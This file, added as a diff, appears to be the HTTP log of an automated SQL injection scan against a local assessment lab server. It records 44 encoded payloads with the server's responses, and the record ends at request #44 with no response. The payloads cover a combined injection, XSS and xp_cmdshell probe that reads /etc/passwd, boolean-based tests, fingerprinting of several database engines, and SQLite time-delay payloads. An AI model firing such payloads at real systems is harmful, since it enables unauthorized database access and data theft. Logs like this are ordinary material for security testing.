@@ -1,0 +1,1008 @@
+HTTP request [#1]:
+GET /item?id=1 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#1] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/item?id=1
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#2]:
+GET /item?id=1&UEAK=3940%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#2] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/item?id=1&UEAK=3940%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#3]:
+GET /item?id=1 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#3] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/item?id=1
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#4]:
+GET /item?id=1.%27%29%2C%2C%22%29%29%2C%2C HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#4] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 45
+URI: http://127.0.0.1:18080/item?id=1.%27%29%2C%2C%22%29%29%2C%2C
+
+SQLite error: unrecognized token: "'),,")),,"
+
+############################################################################
+
+HTTP request [#5]:
+GET /item?id=1%27NPFUNJ%3C%27%22%3EFXQqhj HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#5] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 44
+URI: http://127.0.0.1:18080/item?id=1%27NPFUNJ%3C%27%22%3EFXQqhj
+
+SQLite error: near "'NPFUNJ<'": syntax error
+
+############################################################################
+
+HTTP request [#6]:
+GET /item?id=1%29%20AND%204044%3D6684%20AND%20%286214%3D6214 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#6] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 36
+URI: http://127.0.0.1:18080/item?id=1%29%20AND%204044%3D6684%20AND%20%286214%3D6214
+
+SQLite error: near ")": syntax error
+
+############################################################################
+
+HTTP request [#7]:
+GET /item?id=1%29%20AND%204438%3D4438%20AND%20%281841%3D1841 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#7] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 36
+URI: http://127.0.0.1:18080/item?id=1%29%20AND%204438%3D4438%20AND%20%281841%3D1841
+
+SQLite error: near ")": syntax error
+
+############################################################################
+
+HTTP request [#8]:
+GET /item?id=1%20AND%203175%3D5598 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#8] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/item?id=1%20AND%203175%3D5598
+
+[]
+
+############################################################################
+
+HTTP request [#9]:
+GET /item?id=1%20AND%204438%3D4438 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#9] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/item?id=1%20AND%204438%3D4438
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#10]:
+GET /item?id=1%20AND%204544%3D8308 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#10] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/item?id=1%20AND%204544%3D8308
+
+[]
+
+############################################################################
+
+HTTP request [#11]:
+GET /item?id=1%20AND%20%28SELECT%20CVAR%28NULL%29%20FROM%20MSysAccessObjects%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#11] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 46
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20CVAR%28NULL%29%20FROM%20MSysAccessObjects%29%20IS%20NULL
+
+SQLite error: no such table: MSysAccessObjects
+
+############################################################################
+
+HTTP request [#12]:
+GET /item?id=1%20AND%20%28SELECT%20TDESENCRYPT%28NULL%2CNULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#12] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 43
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20TDESENCRYPT%28NULL%2CNULL%29%29%20IS%20NULL
+
+SQLite error: no such function: TDESENCRYPT
+
+############################################################################
+
+HTTP request [#13]:
+GET /item?id=1%20AND%20%28SELECT%20%25SQLUPPER%20NULL%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#13] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 36
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20%25SQLUPPER%20NULL%29%20IS%20NULL
+
+SQLite error: near "%": syntax error
+
+############################################################################
+
+HTTP request [#14]:
+GET /item?id=1%20AND%20%28SELECT%20halfMD5%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#14] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:53 GMT
+Content-Type: text/plain
+Content-Length: 39
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20halfMD5%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: halfMD5
+
+############################################################################
+
+HTTP request [#15]:
+GET /item?id=1%20AND%20%28SELECT%20MD5%28NULL~NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#15] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 36
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20MD5%28NULL~NULL%29%29%20IS%20NULL
+
+SQLite error: near "~": syntax error
+
+############################################################################
+
+HTTP request [#16]:
+GET /item?id=1%20AND%20%28SELECT%20%28NULL%20SETEQ%20NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#16] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 40
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20%28NULL%20SETEQ%20NULL%29%29%20IS%20NULL
+
+SQLite error: near "SETEQ": syntax error
+
+############################################################################
+
+HTTP request [#17]:
+GET /item?id=1%20AND%20%28SELECT%20CHR%2884%29%7C%7CCHR%2882%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%20FROM%20SYSIBM.SYSDUMMY1%29%3D%27TRDe%27 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#17] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 45
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20CHR%2884%29%7C%7CCHR%2882%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%20FROM%20SYSIBM.SYSDUMMY1%29%3D%27TRDe%27
+
+SQLite error: no such table: SYSIBM.SYSDUMMY1
+
+############################################################################
+
+HTTP request [#18]:
+GET /item?id=1%20AND%20%28SELECT%20NULLIF%28USER%2CSESSION_USER%29%20FROM%20SYSIBM.SYSDUMMY1%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#18] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 45
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20NULLIF%28USER%2CSESSION_USER%29%20FROM%20SYSIBM.SYSDUMMY1%29%20IS%20NULL
+
+SQLite error: no such table: SYSIBM.SYSDUMMY1
+
+############################################################################
+
+HTTP request [#19]:
+GET /item?id=1%20AND%20%28SELECT%20NULLIFZERO%28hashcode%28NULL%29%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#19] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 40
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20NULLIFZERO%28hashcode%28NULL%29%29%29%20IS%20NULL
+
+SQLite error: no such function: hashcode
+
+############################################################################
+
+HTTP request [#20]:
+GET /item?id=1%20AND%20%28SELECT%20%27Azdm%27%20FROM%20RDB%24DATABASE%29%3D%27Azdm%27 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#20] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 41
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20%27Azdm%27%20FROM%20RDB%24DATABASE%29%3D%27Azdm%27
+
+SQLite error: no such table: RDB$DATABASE
+
+############################################################################
+
+HTTP request [#21]:
+GET /item?id=1%20AND%20%28SELECT%20%27MzXj%27%20FROM%20INFORMATION_SCHEMA.IO_STATISTICS%29%3D%27MzXj%27 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#21] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 61
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20%27MzXj%27%20FROM%20INFORMATION_SCHEMA.IO_STATISTICS%29%3D%27MzXj%27
+
+SQLite error: no such table: INFORMATION_SCHEMA.IO_STATISTICS
+
+############################################################################
+
+HTTP request [#22]:
+GET /item?id=1%20AND%20%28SELECT%20STRINGTOUTF8%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#22] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 44
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20STRINGTOUTF8%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: STRINGTOUTF8
+
+############################################################################
+
+HTTP request [#23]:
+GET /item?id=1%20AND%20%28SELECT%20CHAR%2868%29%7C%7CCHAR%2876%29%7C%7CCHAR%2882%29%7C%7CCHAR%2868%29%20FROM%20INFORMATION_SCHEMA.SYSTEM_USERS%29%3D%27DLRD%27 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#23] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 60
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20CHAR%2868%29%7C%7CCHAR%2876%29%7C%7CCHAR%2882%29%7C%7CCHAR%2868%29%20FROM%20INFORMATION_SCHEMA.SYSTEM_USERS%29%3D%27DLRD%27
+
+SQLite error: no such table: INFORMATION_SCHEMA.SYSTEM_USERS
+
+############################################################################
+
+HTTP request [#24]:
+GET /item?id=1%20AND%20%28SELECT%20%27amKV%27%20FROM%20SYSMASTER%3ASYSDUAL%29%3D%27amKV%27 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#24] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 43
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20%27amKV%27%20FROM%20SYSMASTER%3ASYSDUAL%29%3D%27amKV%27
+
+SQLite error: near ":SYSDUAL": syntax error
+
+############################################################################
+
+HTTP request [#25]:
+GET /item?id=1%20AND%20%28SELECT%20ALPHA%28NULL%29%20FROM%20DUAL%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#25] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 33
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20ALPHA%28NULL%29%20FROM%20DUAL%29%20IS%20NULL
+
+SQLite error: no such table: DUAL
+
+############################################################################
+
+HTTP request [#26]:
+GET /item?id=1%20AND%20%28SELECT%20TONUMBER%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#26] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 40
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20TONUMBER%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: TONUMBER
+
+############################################################################
+
+HTTP request [#27]:
+GET /item?id=1%20AND%20%28SELECT%20ASCII_CHAR%28256%29%20FROM%20SYSTEM.ONEROW%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#27] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 42
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20ASCII_CHAR%28256%29%20FROM%20SYSTEM.ONEROW%29%20IS%20NULL
+
+SQLite error: no such table: SYSTEM.ONEROW
+
+############################################################################
+
+HTTP request [#28]:
+GET /item?id=1%20AND%20%28SELECT%20CODE%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#28] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 36
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20CODE%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: CODE
+
+############################################################################
+
+HTTP request [#29]:
+GET /item?id=1%20AND%20%28SELECT%20PARSENAME%28NULL%2CNULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#29] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 41
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20PARSENAME%28NULL%2CNULL%29%29%20IS%20NULL
+
+SQLite error: no such function: PARSENAME
+
+############################################################################
+
+HTTP request [#30]:
+GET /item?id=1%20AND%20%28SELECT%20IFNULL%28QUARTER%28NULL%29%2CNULL%20XOR%20NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#30] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 38
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20IFNULL%28QUARTER%28NULL%29%2CNULL%20XOR%20NULL%29%29%20IS%20NULL
+
+SQLite error: near "XOR": syntax error
+
+############################################################################
+
+HTTP request [#31]:
+GET /item?id=1%20AND%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#31] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 33
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL
+
+SQLite error: no such table: DUAL
+
+############################################################################
+
+HTTP request [#32]:
+GET /item?id=1%20AND%20%28SELECT%20QUOTE_IDENT%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#32] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 43
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20QUOTE_IDENT%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: QUOTE_IDENT
+
+############################################################################
+
+HTTP request [#33]:
+GET /item?id=1%20AND%20%28SELECT%20FROM_HEX%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#33] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 40
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20FROM_HEX%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: FROM_HEX
+
+############################################################################
+
+HTTP request [#34]:
+GET /item?id=1%20AND%20%28SELECT%20IF%28ROWNUMBER%28%29%3E0%2CCONVERT%28NULL%2CTINYINT%29%2CNULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#34] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 34
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20IF%28ROWNUMBER%28%29%3E0%2CCONVERT%28NULL%2CTINYINT%29%2CNULL%29%29%20IS%20NULL
+
+SQLite error: no such function: IF
+
+############################################################################
+
+HTTP request [#35]:
+GET /item?id=1%20AND%20%28SELECT%20BOOLNOT%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#35] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 39
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20BOOLNOT%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: BOOLNOT
+
+############################################################################
+
+HTTP request [#36]:
+GET /item?id=1%20AND%20%28SELECT%20FARM_FINGERPRINT%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#36] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 48
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20FARM_FINGERPRINT%28NULL%29%29%20IS%20NULL
+
+SQLite error: no such function: FARM_FINGERPRINT
+
+############################################################################
+
+HTTP request [#37]:
+GET /item?id=1%20AND%20%28SELECT%20JULIANDAY%28NULL%29%29%20IS%20NULL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#37] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20JULIANDAY%28NULL%29%29%20IS%20NULL
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#38]:
+GET /item?id=1%20AND%20%28SELECT%20CHAR%28116%2C77%2C105%2C78%29%29%3D%27aGOT%27 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#38] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/item?id=1%20AND%20%28SELECT%20CHAR%28116%2C77%2C105%2C78%29%29%3D%27aGOT%27
+
+[]
+
+############################################################################
+
+HTTP request [#39]:
+GET /item?id=%28SELECT%20CONCAT%28CONCAT%28%27qqqkq%27%2C%28CASE%20WHEN%20%281325%3D1325%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qjbkq%27%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#39] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/item?id=%28SELECT%20CONCAT%28CONCAT%28%27qqqkq%27%2C%28CASE%20WHEN%20%281325%3D1325%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qjbkq%27%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#40]:
+GET /item?id=SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7C%28CASE%20WHEN%20%281802%3D1802%29%20THEN%201%20ELSE%200%20END%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#40] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 41
+URI: http://127.0.0.1:18080/item?id=SELECT%20CHAR%28113%2C113%2C113%2C107%2C113%29%7C%7C%28CASE%20WHEN%20%281802%3D1802%29%20THEN%201%20ELSE%200%20END%29%7C%7CCHAR%28113%2C106%2C98%2C107%2C113%29
+
+SQLite error: near "SELECT": syntax error
+
+############################################################################
+
+HTTP request [#41]:
+GET /item?id=1%3BSELECT%20LIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#41] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 59
+URI: http://127.0.0.1:18080/item?id=1%3BSELECT%20LIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29--
+
+SQLite error: You can only execute one statement at a time.
+
+############################################################################
+
+HTTP request [#42]:
+GET /item?id=1%3BSELECT%20LIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#42] (500 Internal Server Error):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:54 GMT
+Content-Type: text/plain
+Content-Length: 59
+URI: http://127.0.0.1:18080/item?id=1%3BSELECT%20LIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29
+
+SQLite error: You can only execute one statement at a time.
+
+############################################################################
+
+HTTP request [#43]:
+GET /item?id=1%20AND%208602%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#43] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:04:55 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/item?id=1%20AND%208602%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#44]:
+GET /item?id=1%20AND%208602%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28000000000%2F2%29%29%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
